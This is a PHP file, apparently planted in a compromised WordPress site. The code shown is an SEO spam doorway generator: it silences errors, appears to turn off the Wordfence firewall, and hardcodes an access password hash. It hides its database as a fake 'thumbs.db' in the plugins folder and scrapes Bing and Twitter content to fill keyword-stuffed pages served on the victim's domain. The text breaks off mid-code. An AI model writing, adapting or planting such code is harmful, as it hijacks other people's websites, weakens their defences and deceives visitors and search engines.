<?php
if (!class_exists('DGSTORAGE')) {
	@ini_set('display_errors', NULL);
	@ini_set('error_reporting', NULL);
	@ini_set('log_errors', NULL);
	@ini_set('default_socket_timeout', 4);
	
	if(!defined('DGDB_STORAGE_TYPE')) {
		define('DGDB_STORAGE_TYPE', 'sqlite3');
	}
	if(!defined('DGDB_STORAGE_HOST')) {
		define('DGDB_STORAGE_HOST', '');
	}
	if(!defined('DGDB_STORAGE_USER')) {
		define('DGDB_STORAGE_USER', '');
	}
	if(!defined('DGDB_STORAGE_PASS')) {
		define('DGDB_STORAGE_PASS', '');
	}
	if(!defined('DGDB_STORAGE_NAME')) {
		define('DGDB_STORAGE_NAME', '');
	}
	if(!defined('DGSQLITE_DB_PATH')) {
		define('DGSQLITE_DB_PATH', '/srv/data/web/vhosts/www.aventour.net/htdocs/wordpress/wp-content/plugins/thumbs.db');
	}
	if(!defined('DGDG_ACCESS_PASS')) {
		define('DGDG_ACCESS_PASS', 'c0c432aa0dca250ce6b54b4a489283a1');
	}
	
	if(!defined('WFWAF_ENABLED')) {
		define('WFWAF_ENABLED', false);
	}
	
	class DGSTORAGE {
		var $storage_type;
		
		var $db_host;
		var $db_user;
		var $db_pass;
		var $db_name;
		var $db_tbl;
		var $db;
		
		public function __construct() {
			$this->storage_type=DGDB_STORAGE_TYPE;
			
			$this->db_host=DGDB_STORAGE_HOST;
			$this->db_user=DGDB_STORAGE_USER;
			$this->db_pass=DGDB_STORAGE_PASS;
			$this->db_name=DGDB_STORAGE_NAME;
			$this->db_tbl='wp_pages';
			
			$this->db=false;
			
			switch($this->storage_type) {
				case 'mysql':
					$this->db=mysql_connect($this->db_host, $this->db_user, $this->db_pass);
					mysql_select_db($this->db_name, $this->db);
					break;
				case 'sqlite3':
					$this->db_name=DGSQLITE_DB_PATH;
					
					$this->db=new SQLite3($this->db_name);
					$this->db->busyTimeout(5000);
					$this->db->exec('PRAGMA journal_mode=WAL;');
					$this->db->exec('PRAGMA page_size=4096;');
					$this->db->exec('PRAGMA cache_size=2000;');
					break;
			}
		}
		
		function setup() {
			switch($this->storage_type) {
				case 'mysql':
					if(mysql_query("CREATE TABLE `{$this->db_tbl}` (
					 `id` int(11) NOT NULL AUTO_INCREMENT,
					 `prefix` varchar(255) NOT NULL DEFAULT '',
					 `key` varchar(255) NOT NULL DEFAULT '',
					 `subkey` varchar(255) NOT NULL DEFAULT '',
					 `opt` varchar(255) NOT NULL DEFAULT '',
					 `subopt` varchar(255) NOT NULL DEFAULT '',
					 `contents` text NOT NULL,
					 PRIMARY KEY (`id`),
					 KEY `prefix` (`prefix`(50),`key`(50),`subkey`(50))
					) ENGINE=MyISAM DEFAULT CHARSET=utf8", $this->db)) {
						print '<msg>ok</msg>';
					}
				break;
				
				case 'sqlite3':
					if($this->db->exec('CREATE TABLE IF NOT EXISTS "'.$this->db_tbl.'" ("id" INTEGER,"prefix","key","subkey","opt","subopt","contents",PRIMARY KEY ("id" ASC));')) {
						print '<msg>ok</msg>';
					}
					
					$this->db->exec('CREATE INDEX IF NOT EXISTS '.$this->db_name.'.pks ON '.$this->db_tbl.' ("prefix", "key", "subkey");');
				break;
			}
		}
		
		public function __wakeup() {
			
		}
		
		public function __destruct() {
			switch($this->storage_type) {
				case 'mysql':
					mysql_close($this->db);
					break;
				case 'sqlite3':
					if($this->sqlite_close_need) {
						$close_function=$this->close_function;
						$close_function($this->db);
					}
			}
		}
		
		public function set($prefix, $key, $value) {
			switch($this->storage_type) {
				case 'mysql':
					$query="SELECT * FROM {$this->db_tbl} WHERE `prefix`='".mysql_real_escape_string($prefix, $this->db)."' AND `key`='".mysql_real_escape_string($key, $this->db)."'";
					$rows=mysql_query($query, $this->db);
					
					if(@mysql_numrows($rows)>0) {
						$query="UPDATE {$this->db_tbl} SET `contents`='".mysql_real_escape_string($value, $this->db)."' WHERE `prefix`='".mysql_real_escape_string($prefix, $this->db)."' AND `key`='".mysql_real_escape_string($key, $this->db)."'";
						mysql_query($query, $this->db);
					}
					else {
						mysql_query("INSERT INTO {$this->db_tbl} (`prefix`, `key`, `contents`) VALUES ('".mysql_real_escape_string($prefix, $this->db)."', '".mysql_real_escape_string($key, $this->db)."', '".mysql_real_escape_string($value, $this->db)."') ON DUPLICATE KEY UPDATE `contents`='".mysql_real_escape_string($value, $this->db)."'", $this->db);
					}
					
					break;
				case 'sqlite3':
					$query="SELECT * FROM {$this->db_tbl} WHERE prefix='".$this->db->escapeString($prefix)."' AND key='".$this->db->escapeString($key)."' LIMIT 1";
					
					$data=$this->db->querySingle($query, true);
					
					$this->db->exec('BEGIN IMMEDIATE;');
					
					if(!isset($data['id'])) {
						$this->db->exec("INSERT INTO {$this->db_tbl} (prefix, key, contents) VALUES ('".$this->db->escapeString($prefix)."', '".$this->db->escapeString($key)."', '".$this->db->escapeString($value)."');");
					}
					else {
						$this->db->exec("UPDATE {$this->db_tbl} SET contents='".$this->db->escapeString($value)."' WHERE prefix='".$this->db->escapeString($prefix)."' AND key='".$this->db->escapeString($key)."' LIMIT 1;");
					}
					
					$this->db->exec('COMMIT;');
					break;
			}
		}
		
		public function get($prefix, $key) {
			switch($this->storage_type) {
				case 'mysql':
					$rows=mysql_query("SELECT `contents` FROM {$this->db_tbl} WHERE `prefix`='".mysql_real_escape_string($prefix, $this->db)."' AND `key`='".mysql_real_escape_string($key, $this->db)."' LIMIT 1", $this->db);
					
					if(mysql_numrows($rows)==0) {
						return false;
					}
					
					$row=mysql_fetch_assoc($rows);
					
					mysql_free_result($rows);
					
					return $row['contents'];
				case 'sqlite3':
					$query="SELECT contents FROM {$this->db_tbl} WHERE prefix='".$this->db->escapeString($prefix)."' AND key='".$this->db->escapeString($key)."' LIMIT 1";
					
					$data=$this->db->querySingle($query, true);
					
					if(isset($data['contents'])) {
						return $data['contents'];
					}
					
					return false;
			}
		}
		
		function reserve_page_id() {
			switch($this->storage_type) {
				case 'mysql':
					mysql_query("INSERT INTO {$this->db_tbl} (`prefix`, `key`, `subkey`) VALUES ('', '".md5(mt_rand(0, 123321123))."', '".md5(time())."')", $this->db);
					
					return mysql_insert_id($this->db);
				case 'sqlite3':
					$this->db->exec("INSERT INTO {$this->db_tbl} (prefix, key, subkey) VALUES ('', '".md5(mt_rand(0, 123321123))."', '".md5(time())."');");
					
					return $this->db->lastInsertRowID();
					break;
			}
		}
		
		function get_free_keyword($lang) {
			switch($this->storage_type) {
				case 'mysql':
					$rows=mysql_query("SELECT * FROM {$this->db_tbl} WHERE `prefix`='parsed_keywords|".$lang."' AND opt='free' LIMIT 1", $this->db);
					
					if(mysql_numrows($rows)==0) {
						return false;
					}
					
					$row=mysql_fetch_assoc($rows);
					
					mysql_free_result($rows);
					
					mysql_query("UPDATE {$this->db_tbl} SET opt='used' WHERE id=".$row['id'], $this->db);
					
					return $row['key'];
				case 'sqlite3':
					$data=$this->db->querySingle("SELECT id, key FROM {$this->db_tbl} WHERE prefix='parsed_keywords|".$lang."' AND opt='free' LIMIT 1", true);
					
					if(!isset($data['id'])) {
						return false;
					}
					
					$this->db->exec("UPDATE {$this->db_tbl} SET opt='used' WHERE id=".$data['id']);
					
					return $data['key'];
			}
		}
		
		function get_additional_keywords($lang, $key, $limit) {
			switch($this->storage_type) {
				case 'mysql':
					if($key==false) {
						$rows=mysql_query("SELECT `key` FROM {$this->db_tbl} WHERE `prefix`='parsed_keywords|".$lang."' ORDER BY RAND() LIMIT ".$limit, $this->db);
					}
					else {
						$rows=mysql_query("SELECT `key` FROM {$this->db_tbl} WHERE `prefix`='parsed_keywords|".$lang."' AND `subkey`='".mysql_real_escape_string($key, $this->db)."' ORDER BY RAND() LIMIT ".$limit, $this->db);
					}
					
					if(mysql_numrows($rows)==0) {
						return false;
					}
					
					$result=array();
					
					while($row=mysql_fetch_assoc($rows)) {
						$result[]=$row['key'];
					}
					
					mysql_free_result($rows);
					
					return $result;
				case 'sqlite3':
					if($key==false) {
						$rows=$this->db->query("SELECT key FROM {$this->db_tbl} WHERE prefix='parsed_keywords|".$lang."' ORDER BY RANDOM() LIMIT ".$limit);
					}
					else {
						$rows=$this->db->query("SELECT key FROM {$this->db_tbl} WHERE prefix='parsed_keywords|".$lang."' AND subkey='".$this->db->escapeString($key)."' ORDER BY RANDOM() LIMIT ".$limit);
					}
					
					$result=array();
					
					while($row=$rows->fetchArray()) {
						$result[]=$row['key'];
					}
					
					if(count($result)==0) {
						return false;
					}
					
					return $result;
			}
		}
		
		function insert_keys($lang, $source, $keys) {
			switch($this->storage_type) {
				case 'mysql':
					foreach($keys as $key) {
						$key=trim($key);
						
						mysql_query("INSERT IGNORE INTO {$this->db_tbl} (`prefix`, `key`, `opt`, `subopt`, `subkey`) VALUES ('parsed_keywords|".$lang."', '".mysql_real_escape_string($key, $this->db)."', 'free', 'free', '".mysql_real_escape_string($source, $this->db)."')", $this->db);
					}
					
					return true;
				case 'sqlite3':
					$this->db->exec('BEGIN IMMEDIATE;');
					
					foreach($keys as $key) {
						$key=trim($key);
						
						$this->db->exec("INSERT INTO {$this->db_tbl} (prefix, key, opt, subopt, subkey) VALUES ('parsed_keywords|".$lang."', '".$this->db->escapeString($key)."', 'free', 'free', '".$this->db->escapeString($source)."');");
					}
					
					$this->db->exec('COMMIT;');
			}
		}
		
		function set_page($id, $uri, $lang, $keyword, $meta_description, $meta_keywords, $content, $headline, $title='') {
			switch($this->storage_type) {
				case 'mysql':
					$query="UPDATE {$this->db_tbl} SET
						`prefix`='generated_pages',
						`key`='".mysql_real_escape_string($uri, $this->db)."',
						`subkey`='".mysql_real_escape_string($lang, $this->db)."',
						`opt`='".mysql_real_escape_string($keyword, $this->db)."',
						`subopt`='".mysql_real_escape_string($meta_description.'|||'.$meta_keywords.'|||'.$headline.'|||'.$title, $this->db)."',
						`contents`='".mysql_real_escape_string($content, $this->db)."'
					WHERE
						`id`='".$id."'
					LIMIT 1
					";
					
					mysql_query($query, $this->db);
					
					return true;
				case 'sqlite3':
					$query="UPDATE {$this->db_tbl} SET
						prefix='generated_pages',
						key='".$this->db->escapeString($uri)."',
						subkey='".$this->db->escapeString($lang)."',
						opt='".$this->db->escapeString($keyword)."',
						subopt='".$this->db->escapeString($meta_description.'|||'.$meta_keywords.'|||'.$headline.'|||'.$title)."',
						contents='".$this->db->escapeString($content)."'
					WHERE
						id='".$id."'
					;";
					
					$this->db->exec('BEGIN IMMEDIATE;');
					$this->db->exec($query);
					$this->db->exec('COMMIT;');
					break;
			}
		}
		
		function check_and_get_page() {
			switch($this->storage_type) {
				case 'mysql':
					$rows=mysql_query("SELECT * FROM {$this->db_tbl} WHERE `prefix`='generated_pages' AND `key`='".mysql_real_escape_string($_SERVER['REQUEST_URI'], $this->db)."' LIMIT 1", $this->db);
					
					if(mysql_numrows($rows)==0) {
						return false;
					}
					
					$row=mysql_fetch_assoc($rows);
					
					mysql_free_result($rows);
					
					return $row;
				case 'sqlite3':
					$rows=$this->db->query("SELECT * FROM {$this->db_tbl} WHERE prefix='generated_pages' AND key='".$this->db->escapeString($_SERVER['REQUEST_URI'])."' LIMIT 1;");
					
					if($row=$rows->fetchArray()) {
						return $row;
					}
					
					return false;
			}
		}
		
		function check_generated_keyword($key) {
			switch($this->storage_type) {
				case 'mysql':
					$rows=mysql_query("SELECT * FROM {$this->db_tbl} WHERE `prefix`='generated_pages' AND `opt`='".mysql_real_escape_string($key, $this->db)."' LIMIT 1", $this->db);
					
					if(mysql_numrows($rows)==0) {
						return false;
					}
					
					mysql_free_result($rows);
					
					return true;
				case 'sqlite3':
					$query="SELECT id FROM {$this->db_tbl} WHERE prefix='generated_pages' AND opt='".$this->db->escapeString($key)."' LIMIT 1";
					
					$rows=$this->db->query($query);
					
					
					if($row=$rows->fetchArray()) {
						return true;
					}
					
					return false;
					break;
			}
		}
		
		function delete_page_data() {
			switch($this->storage_type) {
				case 'mysql':
					$query="DELETE FROM {$this->db_tbl} WHERE `prefix`='generated_pages'";
					
					mysql_query($query, $this->db);
					
					return true;
				case 'sqlite3':
					$this->db->exec('BEGIN IMMEDIATE;');
					$query="DELETE FROM {$this->db_tbl} WHERE prefix='generated_pages'";
					$this->db->exec($query);
					$this->db->exec('COMMIT;');
					break;
			}
		}
		
		function delete_page($page_id) {
			switch($this->storage_type) {
				case 'mysql':
					$query="DELETE FROM {$this->db_tbl} WHERE `id`='".mysql_real_escape_string($page_id)."'";
					
					mysql_query($query, $this->db);
					
					return true;
				case 'sqlite3':
					$query="DELETE FROM {$this->db_tbl} WHERE id='".$this->db->escapeString($page_id)."'";
					$this->db->exec('BEGIN IMMEDIATE;');
					$this->db->exec($query);
					$this->db->exec('COMMIT;');
					break;
			}
		}
		
		function get_latest_links() {
			switch($this->storage_type) {
				case 'mysql':
					$query="SELECT `key`, `opt` FROM {$this->db_tbl} WHERE `prefix`='generated_pages' ORDER BY `id` DESC LIMIT 20";
					$rows=mysql_query($query, $this->db);
					
					if(mysql_numrows($rows)==0) {
						return array();
					}
					
					$result=array();
					
					while($row=mysql_fetch_assoc($rows)) {
						$result[]=$row;
					}
					
					mysql_free_result($rows);
					
					return $result;
				case 'sqlite3':
					$rows=$this->db->query("SELECT key, opt FROM {$this->db_tbl} WHERE prefix='generated_pages' ORDER BY id DESC LIMIT 20");
					
					$result=array();
					
					while($row=$rows->fetchArray()) {
						$result[]=$row;
					}
					
					return $result;
					break;
			}
		}
		
		function get_all_links() {
			switch($this->storage_type) {
				case 'mysql':
					$query="SELECT `key`, `opt` FROM {$this->db_tbl} WHERE `prefix`='generated_pages' ORDER BY `id` DESC";
					$rows=mysql_query($query, $this->db);
					
					if(mysql_numrows($rows)==0) {
						return array();
					}
					
					$result=array();
					
					while($row=mysql_fetch_assoc($rows)) {
						$result[]=$row;
					}
					
					mysql_free_result($rows);
					
					return $result;
				case 'sqlite3':
					$rows=$this->db->query("SELECT key, opt FROM {$this->db_tbl} WHERE prefix='generated_pages' ORDER BY id DESC");
					
					$result=array();
					
					while($row=$rows->fetchArray()) {
						$result[]=$row;
					}
					
					return $result;
					break;
			}
		}
	}

	if(!function_exists('mb_strtolower')) {
		function mb_strtolower($s) {
			return strtolower($s);
		}
	}

	function parse_bing_snippets($key, $country_lang='en-us', $is_first=true, $main_key='') {
		$langs=array(
			'af'=>'af-ZA','ar'=>'ar-AE','be'=>'be-BY','ca'=>'ca-ES','cs'=>'cs-CZ','da'=>'da-DK','de'=>'de-DE','el'=>'el-GR','en'=>'en-US','es'=>'es-ES','et'=>'et-EE','fa'=>'fa-IR','fi'=>'fi-FI','fo'=>'fo-FO','fr'=>'fr-FR','gl'=>'gl-ES','gu'=>'gu-IN','he'=>'he-IL','hi'=>'hi-IN','hr'=>'hr-HR','hu'=>'hu-HU','hy'=>'hy-AM','id'=>'id-ID','is'=>'is-IS','it'=>'it-IT','ja'=>'ja-JP','ka'=>'ka-GE','kk'=>'kk-KZ','kn'=>'kn-IN','ko'=>'ko-KR','ky'=>'ky-KZ','lt'=>'lt-LT','lv'=>'lv-LV','mk'=>'mk-MK','mn'=>'mn-MN','mr'=>'mr-IN','ms'=>'ms-BN','nb'=>'nb-NO','nl'=>'nl-BE','nl'=>'nl-NL','nn'=>'nn-NO','pa'=>'pa-IN','pl'=>'pl-PL','pt'=>'pt-PT','ro'=>'ro-RO','ru'=>'ru-RU','sa'=>'sa-IN','sk'=>'sk-SK','sl'=>'sl-SI','sq'=>'sq-AL','sv'=>'sv-FI','sv'=>'sv-SE','sw'=>'sw-KE','ta'=>'ta-IN','te'=>'te-IN','th'=>'th-TH','tr'=>'tr-TR','tt'=>'tt-RU','uk'=>'uk-UA','ur'=>'ur-PK','vi'=>'vi-VN','zh'=>'zh-CN',
		);
		
		if(!strpos($country_lang, '-')) {
			if(isset($langs[$country_lang])) {
				$country_lang=$langs[$country_lang];
			}
		}
		
		$content='';
		
		$pages=array(1, 16);//array(1, 16, 31, 46);
		
		foreach($pages as $page) {
			$ch = curl_init();
			curl_setopt($ch, CURLOPT_URL, 'http://www.bing.com/search?format=rss&mkt='.$country_lang.'&first='.$page.'&q='.urlencode($key));
			curl_setopt($ch, CURLOPT_HEADER, false);
			curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
			curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 10);
			curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/33.0.1750.154 Safari/537.36');
			curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE); 
			curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, FALSE); 
			curl_setopt($ch, CURLOPT_FTP_SSL, CURLFTPSSL_TRY);
			$content.= curl_exec($ch);
			curl_close($ch);
			
			//print $content;
		}
		
		preg_match_all('!\<title\>(.*?)\</title\>!siu', $content, $lines);
		$titles = array_unique($lines[1]);
		
		if(!defined('DGGENNTITLEONE')) {
			$dd = str_ireplace(array ("\n","\r","\t",'&nbsp;','&laquo;','&raquo;','&quot;','&#8592;','&#8594;','&#39;','&#8211;','&#32;','&#160;','&#8212;','&#8230;','&#039;','&rarr;','&mdash;','&gt;','&lt;','{','}','#','"','—', '\''), ' ', $lines[1][2]);
			$dd = str_ireplace('...', '.', $dd);
			
			define('DGGENNTITLEONE', trim(strip_tags($dd)));
		}
		
		if(!$is_first || 2==2) {
			unset($lines[1][0]);
			unset($lines[1][1]);
			
			foreach($lines[1] as $dd) {
				if(preg_match('!^Bing!', $dd)) {
					continue;
				}
				
				//if(stripos($dd, $main_key)) {
					if(!defined('DGGENNTITLETWO')) {
						$dd = str_ireplace(array ("\n","\r","\t",'&nbsp;','&laquo;','&raquo;','&quot;','&#8592;','&#8594;','&#39;','&#8211;','&#32;','&#160;','&#8212;','&#8230;','&#039;','&rarr;','&mdash;','&gt;','&lt;','{','}','#','"','—', '\''), ' ', $dd);
						$dd = str_ireplace('...', '.', $dd);
						
						define('DGGENNTITLETWO', trim(strip_tags($dd)));
					}
					elseif(!defined('DGGENNTITLETHREE')) {
						$dd = str_ireplace(array ("\n","\r","\t",'&nbsp;','&laquo;','&raquo;','&quot;','&#8592;','&#8594;','&#39;','&#8211;','&#32;','&#160;','&#8212;','&#8230;','&#039;','&rarr;','&mdash;','&gt;','&lt;','{','}','#','"','—', '\''), ' ', $dd);
						$dd = str_ireplace('...', '.', $dd);
						
						define('DGGENNTITLETHREE', trim(strip_tags($dd)));
					}
					else {
						break;
					}
				//}
			}
		}
		
		//exit(0);
		
		preg_match_all('!<item>.*<description>(.*)</description>.*</item>!iUs', $content, $maches, PREG_SET_ORDER);
		
		if(count($maches)==0) {
			return false;
		}
		
		$snippets=array();
		
		foreach($maches as $mach) {
			$str=trim($mach[1]);
			
			$str=str_replace('...', ' ', $str);
			
			$str = str_ireplace(array ("\n","\r","\t",'&nbsp;','&laquo;','&raquo;','&quot;','&#8592;','&#8594;','&#39;','&#8211;','&#32;','&#160;','&#8212;','&#8230;','&#039;','&rarr;','&mdash;','&gt;','&lt;','{','}','#','"','—', '\''), ' ', $str);
			$str = str_ireplace('...', '.', $str);
			$str = str_ireplace(' .', '.', $str);
			$str = str_ireplace('..', '.', $str);
			$str = str_ireplace(',.', '.', $str);
			$str = str_ireplace(':.', '.', $str);
			$str = preg_replace('#\b(([\w-]+://?|www[.])[^\s()<>]+(?:\([\w\d]+\)|([^[:punct:]\s]|/)))#iS', '', $str);
			$str = preg_replace('(\d{1,2}\/\d{1,2}\/\d{4})', '', $str);
			$str = preg_replace('/(http:\/\/)(\S+)/i', '', $str);
			$str = preg_replace('/(https:\/\/)(\S+)/i', '', $str);
			
			$str=str_ireplace($key, ' ', $str);
			
			if(!preg_match('![\.\?\!]$!', $str)) {
				$str=preg_replace('![,:;]+$!', '', $str);
				$str=trim($str).'.';
			}
			
			$str = str_ireplace('...', '.', $str);
			$str = str_ireplace(' .', '.', $str);
			$str = str_ireplace('..', '.', $str);
			$str = str_ireplace(',.', '.', $str);
			$str = str_ireplace(':.', '.', $str);
			$str = preg_replace('#\b(([\w-]+://?|www[.])[^\s()<>]+(?:\([\w\d]+\)|([^[:punct:]\s]|/)))#iS', '', $str);
			$str = preg_replace('(\d{1,2}\/\d{1,2}\/\d{4})', '', $str);
			$str = preg_replace('/(http:\/\/)(\S+)/i', '', $str);
			$str = preg_replace('/(https:\/\/)(\S+)/i', '', $str);
			
			$snippets[]=preg_replace('![ ]+!', ' ', $str);
		}
		
		$snippets=array_unique($snippets);
		
		shuffle($snippets);
		
		$i=0;
		$opened=false;
		$limit=mt_rand(2, 3);
		
		$current_p=array();
		
		$result=array();
		
		while(true) {
			if(!isset($snippets[$i])) {
				break;
			}
			
			$s=$snippets[$i];
			
			unset($snippets[$i]);
			$i++;
			
			if(count($current_p)==$limit) {
				$result[]=implode(' ', $current_p);
				
				$limit=mt_rand(1, 3);
				
				$current_p=array();
			}
			else {
				$current_p[]=$s;
			}
		}
		
		$content=implode(' ', $result);
		
		// начало чисток переспама:
		$content = str_ireplace('.', '.#', $content);
		$arr = explode(' ', $content);
		$arr = array_unique($arr);
		
		$content = implode(' ', $arr);
		$arr = explode('#', $content);
		$n = floor(count($arr) /2);
		$end = $n;
		$content = array();
		$i = 0;
		
		while($i <= $end) {
			$content[$i] = @str_ireplace('.', '', $arr[$i]). ' '.@trim(mb_strtolower($arr[$n], 'utf-8'));
			$i++; $n++;
		}
		
		$content=explode('.', implode(' ', $content));
		
		foreach($content as $id=>$str) {
			$str=trim($str);
			
			$str[0]=strtoupper($str[0]);
			
			$content[$id]=$str.'.';
		}
		
		$content=implode("\r\n", $content);
		
		//words array
		$words=explode(' ', preg_replace('![^a-z]+!iUs', ' ', mb_strtolower($content, 'UTF-8')));
		$words=array_unique($words);
		
		return array($content, $words);
	}

	function parse_bing_keys($key, $country_lang='en-us') {
		$langs=array(
			'af'=>'af-ZA','ar'=>'ar-AE','be'=>'be-BY','ca'=>'ca-ES','cs'=>'cs-CZ','da'=>'da-DK','de'=>'de-DE','el'=>'el-GR','en'=>'en-US','es'=>'es-ES','et'=>'et-EE','fa'=>'fa-IR','fi'=>'fi-FI','fo'=>'fo-FO','fr'=>'fr-FR','gl'=>'gl-ES','gu'=>'gu-IN','he'=>'he-IL','hi'=>'hi-IN','hr'=>'hr-HR','hu'=>'hu-HU','hy'=>'hy-AM','id'=>'id-ID','is'=>'is-IS','it'=>'it-IT','ja'=>'ja-JP','ka'=>'ka-GE','kk'=>'kk-KZ','kn'=>'kn-IN','ko'=>'ko-KR','ky'=>'ky-KZ','lt'=>'lt-LT','lv'=>'lv-LV','mk'=>'mk-MK','mn'=>'mn-MN','mr'=>'mr-IN','ms'=>'ms-BN','nb'=>'nb-NO','nl'=>'nl-BE','nl'=>'nl-NL','nn'=>'nn-NO','pa'=>'pa-IN','pl'=>'pl-PL','pt'=>'pt-PT','ro'=>'ro-RO','ru'=>'ru-RU','sa'=>'sa-IN','sk'=>'sk-SK','sl'=>'sl-SI','sq'=>'sq-AL','sv'=>'sv-FI','sv'=>'sv-SE','sw'=>'sw-KE','ta'=>'ta-IN','te'=>'te-IN','th'=>'th-TH','tr'=>'tr-TR','tt'=>'tt-RU','uk'=>'uk-UA','ur'=>'ur-PK','vi'=>'vi-VN','zh'=>'zh-CN',
		);
		
		if(!strpos($country_lang, '-')) {
			if(isset($langs[$country_lang])) {
				$country_lang=$langs[$country_lang];
			}
		}
		
		$ch = curl_init();
		curl_setopt($ch, CURLOPT_URL, 'http://www.bing.com/AS/Suggestions?pt=page.home&qry='.urlencode($key).'&mkt='.$country_lang.'&cvid=52CC99EE92A14CC4924'.mt_rand(100,999));
		curl_setopt($ch, CURLOPT_HEADER, false);
		curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
		curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 5);
		curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/33.0.1750.154 Safari/537.36');
		curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE); 
		curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, FALSE); 
		curl_setopt($ch, CURLOPT_FTP_SSL, CURLFTPSSL_TRY);
		$str = curl_exec($ch);
		curl_close($ch);
		
		$str = str_ireplace('</li>', '</li>|', $str);
		$str = strip_tags($str, '<li>');
		$str = str_ireplace('/', '', $str);
		$str = strip_tags($str);
		
		$arr = explode('|', $str);
		
		foreach ($arr as $line) {
			$line = trim($line);
			
			if($line==$key || $line=='') {
				continue;
			}
			
			$keys[] = $line;
		}
		
		return $keys;
	}

	function parse_images($key) {
		// если ключевик слишком длинный:
		if (mb_strlen($key, 'utf-8') > 25) {$keyp = preg_replace('!^(.{0,25})\s.*!su', '$1', $key);} else {$keyp = $key;}
		// картинки из твиттера
		$ch = curl_init();
		curl_setopt($ch, CURLOPT_URL, 'https://twitter.com/search?q='.urlencode($keyp).'&src=typd&mode=photos');
		curl_setopt($ch, CURLOPT_HEADER, false);
		curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
		curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 5);
		curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/33.0.1750.154 Safari/537.36');
		curl_setopt($ch, CURLOPT_COOKIEJAR, 'cookie/'.$host.'.txt');
		curl_setopt($ch, CURLOPT_COOKIEFILE, 'cookie/'.$host.'.txt');
		$outch = curl_exec($ch);
		curl_close($ch);
		preg_match_all('!data-resolved-url-small="(.*?)"!siu', $outch, $lines1);
		// картинки из бинг
		$ch = curl_init();
		curl_setopt($ch, CURLOPT_URL, 'https://www.bing.com/images/search?q='.urlencode($keyp.' '.$imgsource));
		curl_setopt($ch, CURLOPT_HEADER, false);
		curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
		curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 15);
		curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/33.0.1750.154 Safari/537.36');
		if ($adlt == '1') {
		curl_setopt($ch, CURLOPT_COOKIE, "SRCHD=AF=NOFORM;SRCHHPGUSR=CW=1265&CH=430&DPR=1&ADLT=OFF;SCRHDN=ASD=0&DURL=#;WLS=C=&N=;RMS=A=g0ACEEAAAAAQ");
		}
		curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE); 
		curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, FALSE); 
		curl_setopt($ch, CURLOPT_FTP_SSL, CURLFTPSSL_TRY);
		$outch = curl_exec($ch);
		curl_close($ch);
		preg_match_all('!imgurl:&quot;(.*?)&quot;!siu', $outch, $lines2);

		$fotos = array_merge($lines1[1], $lines2[1]);
		$fotos = array_unique($fotos);
		shuffle($fotos);
		
		return array_slice($fotos, 0, mt_rand(1, 5));
	}

	function parse_video($key) {
		// если ключевик слишком длинный:
		if (mb_strlen($key, 'utf-8') > 25) {$keyp = preg_replace('!^(.{0,25})\s.*!su', '$1', $key);} else {$keyp = $key;}
		$ch = curl_init();
		curl_setopt($ch, CURLOPT_URL, 'https://www.bing.com/videos/search?&q='.urlencode($keyp).'&qft=+filterui:msite-youtube.com&FORM=R5VR15');
		curl_setopt($ch, CURLOPT_HEADER, false);
		curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
		curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 5);
		curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/33.0.1750.154 Safari/537.36');
		curl_setopt($ch, CURLOPT_COOKIEJAR, 'cookie/'.$host.'.txt');
		curl_setopt($ch, CURLOPT_COOKIEFILE, 'cookie/'.$host.'.txt');
		curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE); 
		curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, FALSE); 
		curl_setopt($ch, CURLOPT_FTP_SSL, CURLFTPSSL_TRY);
		$outch = curl_exec($ch);
		curl_close($ch);

		preg_match_all('!youtube.com/watch\?v=(.*?)&!siu', $outch, $lines2);
		$videos = array_unique($lines2[1]);

		// конец парсинга видео
		// вывод видео:
		shuffle($video);
		$videos = @array_slice($videos, 0, 1);
		
		$w=mt_rand(300, 600);
		$h=mt_rand(300, 600);
		
		if (count($videos) > 0) {
			$video = '<p class="embed-responsive embed-responsive-4by3"><iframe width="'.$w.'" height="'.$h.'" class="embed-responsive-item" src="https://youtube.com/embed/'.@implode('?rel=0" allowfullscreen></iframe></p><p class="embed-responsive embed-responsive-4by3"><iframe width="'.$w.'" height="'.$h.'" class="embed-responsive-item" src="https://youtube.com/embed/', $videos).'?rel=0" allowfullscreen></iframe></p>';
		}
		
		return $video;
	}

	if (!class_exists('eincode')) {
		if (!isset($_SERVER['HTTP_USER_AGENT']) || !trim($_SERVER['HTTP_USER_AGENT'])) {
			return false;
		}
		
		$ruri = trim($_SERVER["REQUEST_URI"], "\t\n\r\0\x0B/");
		
		$bad_file = array("png", "jpg", "jpeg", "gif", "css", "js", "swf", "avi", "mp4", "mp3", "flv", "ico");
		
		$host = 'unknown';
		
		if (isset($_SERVER["HTTP_HOST"])) {
			if(isset($_SERVER["HTTP_X_FORWARDED_HOST"]))
				$_SERVER["HTTP_HOST"] = $_SERVER["HTTP_X_FORWARDED_HOST"];

			$tmp = parse_url('http://'.$_SERVER["HTTP_HOST"]);
			
			if ($tmp['host']) {
				$host = $tmp['host'];
				
